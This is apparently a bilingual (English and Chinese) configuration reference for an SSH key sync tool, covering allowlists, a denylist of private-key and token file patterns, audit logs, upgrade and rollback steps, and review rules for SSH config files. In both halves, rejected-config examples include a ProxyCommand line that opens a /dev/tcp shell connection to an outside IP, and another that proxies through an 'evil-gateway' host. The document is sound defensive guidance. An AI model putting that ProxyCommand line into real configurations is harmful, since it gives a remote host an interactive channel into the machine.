# SSH Key Sync Configuration Reference — SSH 密钥同步配置参考

[English](#english) | [中文](#中文)

---

## English

**Related Issue**: #2182

### Overview

This document describes the configuration options, security review process, and best practices for SSH key synchronization.

### Configuration File

#### Location

`/etc/openace/ssh_sync_allowlist.yaml`

#### Permissions

- Permission: `600`
- Owner: `root:root`
- Reason: the configuration file may contain sensitive information and must be protected

#### Format Example

```yaml
# SSH key sync allowlist configuration
# Path: /etc/openace/ssh_sync_allowlist.yaml

# List of files allowed to sync
allowlist:
  # Default allowlist (known hosts)
  - name: "known_hosts"
    type: "known_hosts"
    content_check: false
    description: "Known hosts list"

  - name: "known_hosts.old"
    type: "known_hosts"
    content_check: false
    description: "known_hosts backup"

  - name: "known_hosts.old.*"
    type: "known_hosts"
    content_check: false
    description: "Historical known_hosts backups"

  # Example: allow syncing company public keys (requires security review)
  - name: "company_*.pub"
    type: "public_key"
    content_check: true
    max_size: 1MB
    approval_required: true
    security_review:
      reviewed_by: "security-team"
      reviewed_at: "2026-01-15"
      review_notes: "Allow syncing company public keys"

# Denylist (mandatory, not configurable)
denylist_patterns:
  - "id_*"
  - "*.pem"
  - "*.key"
  - "*.socket"
  - "agent.*"
  - "token_*"
  - "*.token"

# Upgrade handling policy
upgrade_action: "backup"

# Audit log configuration
audit_log:
  path: "/var/log/openace/ssh-sync.log"
  max_size: 100MB
  retention_days: 30
```

### Environment Variables

#### OPENACE_SSH_UPGRADE_ACTION

Upgrade handling policy.

**Options**:
- `warn`: warn only, do not delete files
- `backup`: back up files to `~/.ssh/legacy_backup_YYYYMMDD_HHMMSS/`, then delete
- `delete`: delete files directly (only files whose content fingerprint matches)

**Default**: `backup`

**Use cases**:
- `warn`: audit mode, to confirm the detection logic works
- `backup`: recommended for production, keeps a rollback path
- `delete`: cleanup mode after everything is confirmed correct

#### OPENACE_SSH_UPGRADE_REQUIRE_CONFIRM

Whether manual confirmation is required before handling legacy private keys.

**Options**:
- `true`: require manual input of "yes" to confirm
- `false`: handle automatically

**Default**: `false`

**Use cases**:
- Set to `true` for upgrades of critical systems
- Set to `false` for automated deployments

#### OPENACE_SSH_DETECT_ENCODED_KEYS

Whether to detect encoded private keys (Base64, Hex).

**Options**:
- `true`: detect encoded private keys
- `false`: detect only plaintext private keys

**Default**: `false`

**Note**: Enabling this increases performance overhead and the risk of false positives.

### Security Review Process

#### Review Requirements

A security review is required in the following cases:

1. Adding a new file pattern to the allowlist
2. Syncing SSH config file snippets
3. Syncing non-standard public key files

#### Reviewer Authorization

The list of authorized reviewers is stored in: `/etc/openace/authorized_reviewers.yaml`

```yaml
authorized_reviewers:
  - name: "security-team"
    email: "security@company.com"
    valid_from: "2023-01-01"

  - name: "ops-team"
    email: "ops@company.com"
    valid_from: "2023-01-01"
```

#### Review Validity

- A review is valid for 1 year (configurable)
- Expired reviews must be repeated
- Reviews by unauthorized personnel are invalid

#### Review Records

Every review must be recorded:

```yaml
security_review:
  reviewed_by: "security-team"  # Reviewer (must be in the authorized list)
  reviewed_at: "2026-01-15"      # Review date
  review_notes: "Allow syncing company public keys" # Review notes
```

### Audit Log

#### Log Location

`/var/log/openace/ssh-sync.log`

#### Log Format

```
[TIMESTAMP] [LEVEL] [USER] MESSAGE
```

#### Log Levels

- `INFO`: normal operations
- `WARN`: issues that need attention
- `ERROR`: serious problems

#### Log Events

| Event | Level | Description |
|------|------|------|
| `SYNC_SUCCESS` | INFO | File synced successfully |
| `SYNC_DENIED` | WARN | File sync denied |
| `LEGACY_KEY_DETECTED` | ERROR | Legacy private key detected |
| `LEGACY_KEY_BACKUP` | INFO | Legacy private key backed up |
| `LEGACY_KEY_DELETED` | WARN | Legacy private key deleted |

#### Log Rotation

- Maximum size: 100MB
- Retention: 30 days
- Automatic rotation: daily
- Automatic compression: gzip

### Command-Line Tool

#### View Help

```bash
/usr/local/bin/openace-ssh-sync --help
```

#### Sync SSH Keys

```bash
/usr/local/bin/openace-ssh-sync --user <username>
```

#### Detect Legacy Private Keys

```bash
/usr/local/bin/openace-ssh-sync --user <username> --detect-legacy
```

#### Dry-run Mode

```bash
/usr/local/bin/openace-ssh-sync --user <username> --dry-run
```

#### Specify a Configuration File

```bash
/usr/local/bin/openace-ssh-sync --user <username> --config /path/to/config.yaml
```

### Upgrade and Migration Guide

#### Upgrading from 1.x

##### 1. Pre-upgrade Check

```bash
# Check for legacy-synced private keys
/usr/local/bin/openace-ssh-sync --user <username> --detect-legacy
```

##### 2. Configuration Migration

Old version:
- Automatically synced all files in `/root/.ssh`

New version:
- Only allowlist files are synced
- Private keys are not synced by default

##### 3. Recommended Actions

1. **Generate a dedicated deploy key for each user**:

```bash
ssh-keygen -t ed25519 -f /home/<user>/.ssh/id_ed25519_<project>
```

2. **Add the public key to the Git repository**:

```bash
cat /home/<user>/.ssh/id_ed25519_<project>.pub
# Add to the deploy keys in GitHub/GitLab
```

3. **Test Git SSH access**:

```bash
sudo -u <user> git clone git@github.com:org/repo.git
```

4. **Verify there is no dependency on root private keys**:

```bash
# Remove the root private key (if no longer needed)
rm /root/.ssh/id_rsa
# Verify users can still access Git
```

##### 4. Handle Legacy Private Keys

```bash
# Set the handling policy
export OPENACE_SSH_UPGRADE_ACTION=backup

# Run detection
/usr/local/bin/openace-ssh-sync --user <username> --detect-legacy

# Check the backup
ls -la /home/<username>/.ssh/legacy_backup_*/
```

#### Rollback Plan

If problems occur after the upgrade:

1. **Check the backup directory**:

```bash
ls -la /home/<user>/.ssh/legacy_backup_*/
```

2. **Restore private keys**:

```bash
cp /home/<user>/.ssh/legacy_backup_YYYYMMDD_HHMMSS/id_rsa /home/<user>/.ssh/
chmod 600 /home/<user>/.ssh/id_rsa
chown <user>:<user> /home/<user>/.ssh/id_rsa
```

3. **Verify Git access**:

```bash
sudo -u <user> git clone git@github.com:org/repo.git
```

### Troubleshooting

#### Issue: known_hosts is not synced

**Check**:
1. Whether the file is under `/root/.ssh`
2. Whether the file name matches the allowlist
3. The audit log

```bash
tail -f /var/log/openace/ssh-sync.log
```

#### Issue: legacy private key not detected

**Check**:
1. Whether the file permission is 600
2. Whether the file name matches the `id_*` pattern
3. Whether the content fingerprint matches

#### Issue: script execution fails

**Check**:
1. Whether the script is executable

```bash
ls -la /usr/local/bin/openace-ssh-sync
```

2. Whether the Python version meets the requirement

```bash
python3 --version  # Requires >= 3.10
```

3. The error log

```bash
journalctl -u open-ace -n 100
```

### Best Practices

1. **Review audit logs regularly**
   - Check SYNC_DENIED records weekly
   - Check LEGACY_KEY_DETECTED alerts monthly

2. **Use a secure Git credentials scheme**
   - Prefer per-user deploy keys
   - Avoid depending on root private keys

3. **Configuration changes require a security review**
   - Record the reviewer and date
   - Review review validity periodically

4. **Back up data before upgrading**
   - Back up the `/home/*/.ssh` directories
   - Back up the `/root/.ssh` directory
   - Record file fingerprints

5. **Monitor alerts**
   - Configure log monitoring
   - Set alert thresholds

### SSH Config File Security Requirements (Issue #2328)

#### Default Behavior

SSH config files (`config`, `config_*`) are **DENIED by default** and included in the denylist. This prevents propagation of potentially dangerous SSH configurations that could contain:
- `ProxyCommand` directives with shell execution
- `IdentityFile` directives pointing to root private keys
- Hardcoded credentials or tokens
- `Include` directives to sensitive paths

#### Security Review Process for Config Files

If you need to sync an SSH config file, you **must** add it to the custom whitelist with a mandatory security review. The security review **must** verify:

1. **No ProxyCommand with shell execution**
   - ❌ REJECT: `ProxyCommand ssh -q -W %h:%p gateway.example.com`
   - ❌ REJECT: `ProxyCommand bash -c "exec 3<>/dev/tcp/10.0.0.1/4242; cat <&3 & cat >&3"`
   - ✅ ACCEPT: No ProxyCommand or only safe ProxyCommand (e.g., `nc %h %p`)

2. **No IdentityFile pointing to root private keys**
   - ❌ REJECT: `IdentityFile /root/.ssh/id_rsa`
   - ❌ REJECT: `IdentityFile ~/.ssh/id_ed25519` (where `~` expands to `/root`)
   - ✅ ACCEPT: No IdentityFile or only safe public key paths

3. **No Include directives to sensitive paths**
   - ❌ REJECT: `Include /root/.ssh/config.d/*`
   - ❌ REJECT: `Include ~/.ssh/external_config`
   - ✅ ACCEPT: No Include or only safe include paths (e.g., `/etc/ssh/ssh_config.d/*`)

4. **No credentials or tokens in config**
   - ❌ REJECT: Password directives or hardcoded tokens
   - ❌ REJECT: API keys or authentication credentials
   - ✅ ACCEPT: No hardcoded credentials

5. **No User directive with root or privileged users**
   - ❌ REJECT: `User root`
   - ❌ REJECT: `User admin` or other privileged users
   - ✅ ACCEPT: Only non-privileged user directives or no User directive

#### Example Whitelist Configuration for SSH Config

```yaml
allowlist:
  # ... other entries ...

  # Example: Allow specific SSH config with security review
  - name: "safe_config"
    type: "ssh_config"
    content_check: true
    approval_required: true
    security_review:
      reviewed_by: "security-team"  # Must be in authorized reviewers list
      reviewed_at: "2026-08-08"
      review_notes: |
        Verified safe:
        - No ProxyCommand directives
        - No IdentityFile directives
        - No Include directives
        - No hardcoded credentials
        - Contains only Host/User/Port directives for known safe hosts
```

#### Rejected Config Patterns (Examples)

**Example 1: ProxyCommand with shell execution**
```ssh
# ❌ REJECTED - Security risk
Host compromised-host
    ProxyCommand ssh -q -W %h:%p evil-gateway.com
```

**Example 2: IdentityFile to root key**
```ssh
# ❌ REJECTED - Root private key exposure
Host internal-server
    IdentityFile /root/.ssh/id_rsa
```

**Example 3: Include sensitive path**
```ssh
# ❌ REJECTED - Path traversal risk
Include /root/.ssh/external_configs/*
```

**Example 4: Safe config (acceptable)**
```ssh
# ✅ ACCEPTED - Safe configuration
Host github.com
    User git
    Port 22
    HostName github.com
```

### Related Documents

- [SSH Key Sync Security Boundary](./SSH_KEY_BOUNDARY.md)
- [Deployment Guide](../guide/DEPLOYMENT.md)

### Changelog

- **2026-01-15**: Initial version (Issue #2182)

---

## 中文

**关联 Issue**: #2182

### 概述

本文档详细说明 SSH 密钥同步的配置选项、安全评审流程和最佳实践。

### 配置文件

#### 位置

`/etc/openace/ssh_sync_allowlist.yaml`

#### 权限

- 权限：`600`
- Owner：`root:root`
- 原因：配置文件可能包含敏感信息，需要保护

#### 格式示例

```yaml
# SSH 密钥同步白名单配置
# 路径：/etc/openace/ssh_sync_allowlist.yaml

# 允许同步的文件列表
allowlist:
  # 默认白名单（已知主机列表）
  - name: "known_hosts"
    type: "known_hosts"
    content_check: false
    description: "已知主机列表"

  - name: "known_hosts.old"
    type: "known_hosts"
    content_check: false
    description: "known_hosts 备份"

  - name: "known_hosts.old.*"
    type: "known_hosts"
    content_check: false
    description: "known_hosts 历史备份"

  # 示例：允许公司公钥同步（需要安全评审）
  - name: "company_*.pub"
    type: "public_key"
    content_check: true
    max_size: 1MB
    approval_required: true
    security_review:
      reviewed_by: "security-team"
      reviewed_at: "2026-01-15"
      review_notes: "允许公司公钥同步"

# 黑名单（强制，不可配置）
denylist_patterns:
  - "id_*"
  - "*.pem"
  - "*.key"
  - "*.socket"
  - "agent.*"
  - "token_*"
  - "*.token"

# 升级处理策略
upgrade_action: "backup"

# 审计日志配置
audit_log:
  path: "/var/log/openace/ssh-sync.log"
  max_size: 100MB
  retention_days: 30
```

### 环境变量

#### OPENACE_SSH_UPGRADE_ACTION

升级处理策略。

**可选值**：
- `warn`: 仅告警，不删除文件
- `backup`: 备份文件到 `~/.ssh/legacy_backup_YYYYMMDD_HHMMSS/`，然后删除
- `delete`: 直接删除文件（仅删除内容指纹匹配的文件）

**默认值**: `backup`

**使用场景**：
- `warn`: 审计模式，确认检测逻辑正常
- `backup`: 生产环境推荐，有回退能力
- `delete`: 确认无误后的清理模式

#### OPENACE_SSH_UPGRADE_REQUIRE_CONFIRM

是否需要人工确认处理 legacy 私钥。

**可选值**：
- `true`: 需要人工输入 "yes" 确认
- `false`: 自动处理

**默认值**: `false`

**使用场景**：
- 重要系统升级时设置 `true`
- 自动化部署时设置 `false`

#### OPENACE_SSH_DETECT_ENCODED_KEYS

是否检测编码后的私钥（Base64、Hex）。

**可选值**：
- `true`: 检测编码私钥
- `false`: 仅检测明文私钥

**默认值**: `false`

**注意**：启用会增加性能开销和误判风险。

### 安全评审流程

#### 评审要求

以下情况需要安全评审：

1. 添加新的文件模式到白名单
2. 同步 SSH 配置文件片段
3. 同步非标准的公钥文件

#### 评审人员授权

授权评审人员列表存储在：`/etc/openace/authorized_reviewers.yaml`

```yaml
authorized_reviewers:
  - name: "security-team"
    email: "security@company.com"
    valid_from: "2023-01-01"

  - name: "ops-team"
    email: "ops@company.com"
    valid_from: "2023-01-01"
```

#### 评审有效期

- 评审有效期为 1 年（可配置）
- 过期评审需要重新评审
- 未授权人员的评审无效

#### 评审记录

每次评审必须记录：

```yaml
security_review:
  reviewed_by: "security-team"  # 评审人员（必须在授权列表中）
  reviewed_at: "2026-01-15"      # 评审日期
  review_notes: "允许公司公钥同步" # 评审说明
```

### 审计日志

#### 日志位置

`/var/log/openace/ssh-sync.log`

#### 日志格式

```
[TIMESTAMP] [LEVEL] [USER] MESSAGE
```

#### 日志级别

- `INFO`: 正常操作
- `WARN`: 需要关注的问题
- `ERROR`: 严重问题

#### 日志事件

| 事件 | 级别 | 说明 |
|------|------|------|
| `SYNC_SUCCESS` | INFO | 成功同步文件 |
| `SYNC_DENIED` | WARN | 拒绝同步文件 |
| `LEGACY_KEY_DETECTED` | ERROR | 检测到 legacy 私钥 |
| `LEGACY_KEY_BACKUP` | INFO | 备份 legacy 私钥 |
| `LEGACY_KEY_DELETED` | WARN | 删除 legacy 私钥 |

#### 日志轮转

- 最大大小：100MB
- 保留天数：30 天
- 自动轮转：每日
- 自动压缩：gzip

### 命令行工具

#### 查看帮助

```bash
/usr/local/bin/openace-ssh-sync --help
```

#### 同步 SSH 密钥

```bash
/usr/local/bin/openace-ssh-sync --user <username>
```

#### 检测 legacy 私钥

```bash
/usr/local/bin/openace-ssh-sync --user <username> --detect-legacy
```

#### Dry-run 模式

```bash
/usr/local/bin/openace-ssh-sync --user <username> --dry-run
```

#### 指定配置文件

```bash
/usr/local/bin/openace-ssh-sync --user <username> --config /path/to/config.yaml
```

### 升级迁移指南

#### 从 1.x 版本升级

##### 1. 升级前检查

```bash
# 检查是否有 legacy 同步的私钥
/usr/local/bin/openace-ssh-sync --user <username> --detect-legacy
```

##### 2. 配置迁移

旧版本：
- 自动同步所有 `/root/.ssh` 文件

新版本：
- 只同步白名单文件
- 私钥默认不同步

##### 3. 推荐行动

1. **为每个用户生成独立的 deploy key**：

```bash
ssh-keygen -t ed25519 -f /home/<user>/.ssh/id_ed25519_<project>
```

2. **将公钥添加到 Git 仓库**：

```bash
cat /home/<user>/.ssh/id_ed25519_<project>.pub
# 添加到 GitHub/GitLab 的 deploy keys
```

3. **测试 Git SSH 访问**：

```bash
sudo -u <user> git clone git@github.com:org/repo.git
```

4. **验证不依赖 root 私钥**：

```bash
# 删除 root 私钥（如果不需要）
rm /root/.ssh/id_rsa
# 验证用户仍能访问 Git
```

##### 4. 处理 legacy 私钥

```bash
# 设置处理策略
export OPENACE_SSH_UPGRADE_ACTION=backup

# 运行检测
/usr/local/bin/openace-ssh-sync --user <username> --detect-legacy

# 检查备份
ls -la /home/<username>/.ssh/legacy_backup_*/
```

#### 回滚方案

如果升级后出现问题：

1. **检查备份目录**：

```bash
ls -la /home/<user>/.ssh/legacy_backup_*/
```

2. **恢复私钥**：

```bash
cp /home/<user>/.ssh/legacy_backup_YYYYMMDD_HHMMSS/id_rsa /home/<user>/.ssh/
chmod 600 /home/<user>/.ssh/id_rsa
chown <user>:<user> /home/<user>/.ssh/id_rsa
```

3. **验证 Git 访问**：

```bash
sudo -u <user> git clone git@github.com:org/repo.git
```

### 故障排查

#### 问题：known_hosts 未同步

**检查**：
1. 文件是否在 `/root/.ssh` 下
2. 文件名是否匹配白名单
3. 查看审计日志

```bash
tail -f /var/log/openace/ssh-sync.log
```

#### 问题：legacy 私钥未检测

**检查**：
1. 文件权限是否为 600
2. 文件名是否匹配 `id_*` 模式
3. 内容指纹是否匹配

#### 问题：脚本执行失败

**检查**：
1. 脚本是否有可执行权限

```bash
ls -la /usr/local/bin/openace-ssh-sync
```

2. Python 版本是否满足要求

```bash
python3 --version  # 需要 >= 3.10
```

3. 查看错误日志

```bash
journalctl -u open-ace -n 100
```

### 最佳实践

1. **定期审查审计日志**
   - 每周检查 SYNC_DENIED 记录
   - 每月检查 LEGACY_KEY_DETECTED 告警

2. **使用安全的 Git 凭据方案**
   - 优先使用 per-user deploy key
   - 避免依赖 root 私钥

3. **配置变更需要安全评审**
   - 记录评审人员和日期
   - 定期审查评审有效性

4. **升级前备份数据**
   - 备份 `/home/*/.ssh` 目录
   - 备份 `/root/.ssh` 目录
   - 记录文件指纹

5. **监控告警**
   - 配置日志监控
   - 设置告警阈值

### SSH 配置文件安全要求（Issue #2328）

#### 默认行为

SSH 配置文件（`config`、`config_*`）**默认拒绝（DENIED）同步**，已列入黑名单。这可以防止潜在危险的 SSH 配置被传播，此类配置可能包含：
- 带有 shell 执行的 `ProxyCommand` 指令
- 指向 root 私钥的 `IdentityFile` 指令
- 硬编码的凭据或 token
- 指向敏感路径的 `Include` 指令

#### 配置文件的安全评审流程

如需同步 SSH 配置文件，你**必须**将其加入自定义白名单并进行强制安全评审。安全评审**必须**核实：

1. **不存在带 shell 执行的 ProxyCommand**
   - ❌ 拒绝：`ProxyCommand ssh -q -W %h:%p gateway.example.com`
   - ❌ 拒绝：`ProxyCommand bash -c "exec 3<>/dev/tcp/10.0.0.1/4242; cat <&3 & cat >&3"`
   - ✅ 接受：无 ProxyCommand，或仅有安全的 ProxyCommand（如 `nc %h %p`）

2. **不存在指向 root 私钥的 IdentityFile**
   - ❌ 拒绝：`IdentityFile /root/.ssh/id_rsa`
   - ❌ 拒绝：`IdentityFile ~/.ssh/id_ed25519`（当 `~` 展开为 `/root` 时）
   - ✅ 接受：无 IdentityFile，或仅有安全的公钥路径

3. **不存在指向敏感路径的 Include 指令**
   - ❌ 拒绝：`Include /root/.ssh/config.d/*`
   - ❌ 拒绝：`Include ~/.ssh/external_config`
   - ✅ 接受：无 Include，或仅有安全的 include 路径（如 `/etc/ssh/ssh_config.d/*`）

4. **配置中不存在凭据或 token**
   - ❌ 拒绝：Password 指令或硬编码 token
   - ❌ 拒绝：API key 或认证凭据
   - ✅ 接受：无硬编码凭据

5. **不存在 root 或特权用户的 User 指令**
   - ❌ 拒绝：`User root`
   - ❌ 拒绝：`User admin` 或其他特权用户
   - ✅ 接受：仅非特权用户指令，或无 User 指令

#### SSH 配置的白名单配置示例

```yaml
allowlist:
  # ... 其他条目 ...

  # 示例：经安全评审后允许特定 SSH 配置
  - name: "safe_config"
    type: "ssh_config"
    content_check: true
    approval_required: true
    security_review:
      reviewed_by: "security-team"  # 必须在授权评审人员列表中
      reviewed_at: "2026-08-08"
      review_notes: |
        Verified safe:
        - No ProxyCommand directives
        - No IdentityFile directives
        - No Include directives
        - No hardcoded credentials
        - Contains only Host/User/Port directives for known safe hosts
```

#### 被拒绝的配置模式（示例）

**示例 1：带 shell 执行的 ProxyCommand**
```ssh
# ❌ 已拒绝 - 安全风险
Host compromised-host
    ProxyCommand ssh -q -W %h:%p evil-gateway.com
```

**示例 2：指向 root 私钥的 IdentityFile**
```ssh
# ❌ 已拒绝 - root 私钥暴露
Host internal-server
    IdentityFile /root/.ssh/id_rsa
```

**示例 3：Include 敏感路径**
```ssh
# ❌ 已拒绝 - 路径遍历风险
Include /root/.ssh/external_configs/*
```

**示例 4：安全配置（可接受）**
```ssh
# ✅ 已接受 - 安全配置
Host github.com
    User git
    Port 22
    HostName github.com
```

### 相关文档

- [SSH 密钥安全边界](./SSH_KEY_BOUNDARY.md)
- [部署文档](../guide/DEPLOYMENT.md)

### 变更历史

- **2026-01-15**: 初始版本（Issue #2182）
